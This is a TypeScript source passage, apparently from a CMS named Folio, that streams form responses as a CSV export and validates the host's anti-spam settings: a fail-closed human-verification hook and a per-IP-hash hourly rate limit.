 * SQLite's JSON1 is built into D1, so this is one scan of the form's responses.
 * It reads `files` as well as `data`: a `file` question stores no answer, so a
 * *retired* one would otherwise vanish from the export entirely, taking the
 * filenames of everything anybody ever attached with it.
 *
 * Two binds, whatever the form holds.
 */
export async function submittedKeys(db: FolioDb, formId: string): Promise<string[]> {
  const { results } = await db
    .prepare(
      `select distinct key from (
         select j.key as key from form_responses, json_each(form_responses.data) j
          where form_responses.form_id = ?
         union
         select json_extract(f.value, '$.field') as key
           from form_responses, json_each(form_responses.files) f
          where form_responses.form_id = ?
       ) where key is not null`,
    )
    .bind(formId, formId)
    .all<{ key: string }>()
  return results.map((row) => row.key)
}

export interface ResponseCsv {
  /** `content-disposition`'s filename. ASCII by construction — `safeFilename`,
   *  the codebase's one sanitiser — so the header cannot be split by it. */
  filename: string
  body: ReadableStream<Uint8Array>
}

/**
 * The export, as a stream (`../../docs/specs/foundation/pagination.md`'s keyset,
 * walked).
 *
 * The header query is awaited **before** the stream is built, so a failure there
 * is an ordinary error response rather than a truncated file somebody opens in
 * Excel and believes. Everything after it is pulled a page at a time: a
 * fifty-thousand-row form is 250 statements and never one buffered string.
 *
 * A **BOM** leads the file. It is the one thing that makes Excel on Windows read
 * a UTF-8 CSV as UTF-8 rather than as the machine's local code page, and the
 * export exists for people whose next step is opening it there; every other
 * parser skips it. Named here because it is a byte before the header that a test
 * asserting "the header is exact" has to know about.
 */
export async function responseCsv(
  db: FolioDb,
  form: Form,
  filter: ResponseFilter = {},
): Promise<ResponseCsv> {
  const columns = responseCsvColumns(form.fields, await submittedKeys(db, form.id))
  const encoder = new TextEncoder()
  const date = new Date().toISOString().slice(0, 10)

  let cursor: string | undefined
  let finished = false

  const body = new ReadableStream<Uint8Array>({
    start(controller) {
      controller.enqueue(encoder.encode(BOM + csvRow(columns.map((column) => column.key))))
    },
    async pull(controller) {
      if (finished) {
        controller.close()
        return
      }
      const page = await listResponses(db, form.id, {
        limit: CSV_PAGE,
        filter,
        ...(cursor ? { cursor } : {}),
      })
      let chunk = ''
      for (const response of page.rows) {
        chunk += csvRow(columns.map((column) => csvValue(column, response)))
      }
      if (chunk !== '') controller.enqueue(encoder.encode(chunk))
      cursor = page.cursor ?? undefined
      if (!cursor) finished = true
    },
  })

  return { filename: safeFilename(`${form.name}-responses-${date}.csv`), body }
}

/* ------------------------------------------------- the host's own half --- */

/**
 * What a host may configure about submissions (`FolioConfig.forms`).
 *
 * Two keys, and between them the two anti-spam controls Folio cannot decide for
 * itself. The third — the honeypot — is always on and needs no configuration at
 * all, which is why it is not here.
 *
 * Absent is a complete answer: the honeypot still runs, the default rate limit
 * still applies, and nothing verifies. That is what "this site does not verify"
 * looks like, the same shape `gate` and `describe` take toward their features.
 */
export interface FolioForms<Env> {
  /**
   * Human verification — a host function, not a vendor name and a key
   * (decision 9).
   *
   * Turnstile and hCaptcha both mint their token **client-side at submit time**,
   * which makes them the one mechanism a week-old cached page cannot invalidate;
   * a signed nonce with a minimum fill time cannot work here at all, because
   * every visitor to a cached page holds the same token issued at the same
   * moment. So Folio holds no key, calls no third party, keeps no vendor list and
   * has no timeout policy for anybody to disagree with.
   *
   * Receives the **raw** body, before undeclared keys are dropped, because the
   * token's name belongs to the host's widget and Folio does not know it
   * (decision 13).
   *
   * **Fails closed, including on a throw** (decision 11). This is the opposite
   * posture to the hooks it sits beside, and the difference is the point: a hook
   * runs after a write has committed and its failure must never undo one, while
   * this runs before and its whole job is to refuse traffic nobody can vouch for.
   * A captcha that opens on error is decorative — making it error is the first
   * thing an attacker tries.
   *
   * **Declared as a method rather than a property-typed arrow**, for
   * `FolioGate`'s stated reason: only method parameters are bivariant under
   * `strictFunctionTypes`, and without that a host's `FolioForms<Env>` would not
   * be assignable to the `FolioForms<unknown>` the runtime widens it to.
   */
  verify?(
    input: { req: Request; body: Readonly<Record<string, string>>; form: FormMeta },
    env: Env,
  ): boolean | Promise<boolean>
  /**
   * Submissions per IP-hash per hour. Default 10, valid 1–100, and **0 disables
   * it entirely**.
   *
   * Ten rather than three because the limit is per *address*, and a shared NAT
   * puts a whole office behind one (decision 9's edge case). Like
   * `recentChallengeCount`, it is a partial answer and says so: it bounds a
   * script, not a botnet.
   */
  ratePerHour?: number
}

/** `FolioConfig.forms`, validated and defaulted. */
export interface ResolvedForms {
  config: FolioForms<unknown>
  /** `config.ratePerHour`, defaulted. `0` means no limit is applied. */
  ratePerHour: number
}

const FORMS_KEYS = ['verify', 'ratePerHour']

/**
 * Construction-time validation, alongside `validateGate`, `validateDescribe` and
 * `validateHooks` and for their reason: a configuration mistake in a CMS should
 * throw once, before a request is served.
 *
 * The stakes are a rung higher here than for the others. The request that would
 * otherwise discover a broken `verify` is an anonymous POST from the public
 * internet — so a `verify` that is not a function would fail closed on every
 * submission the site ever received, and the symptom is a contact form that
 * silently collects nothing while the admin shows no error at all.
 *
 * Unknown keys are refused, the treatment `hooks` and `describe` both get:
 * `verifiy` or `ratePerHourly` would otherwise be a silently ignored preference,
 * and one of those two silences is "this site is not verifying anybody".
 */
export function validateForms<Env>(forms: FolioForms<Env> | undefined): ResolvedForms | null {
  if (!forms) return null

  for (const key of Object.keys(forms)) {
    if (!FORMS_KEYS.includes(key)) {
      throw new Error(`folio: unknown \`forms\` key "${key}" (valid: ${FORMS_KEYS.join(', ')})`)
    }
  }
  if (forms.verify !== undefined && typeof forms.verify !== 'function') {
    throw new Error('folio: `forms.verify` must be a function — the host decides who is human')
  }

  const ratePerHour = forms.ratePerHour ?? DEFAULT_RATE_PER_HOUR
  const inRange =
    ratePerHour === 0 || (ratePerHour >= MIN_RATE_PER_HOUR && ratePerHour <= MAX_RATE_PER_HOUR)
  if (!Number.isInteger(ratePerHour) || !inRange) {
    throw new Error(
      `folio: \`forms.ratePerHour\` is ${JSON.stringify(forms.ratePerHour)}; it must be 0 (no limit) or a whole number from ${MIN_RATE_PER_HOUR} to ${MAX_RATE_PER_HOUR}`,
    )
  }

  return { config: forms as FolioForms<unknown>, ratePerHour }
}
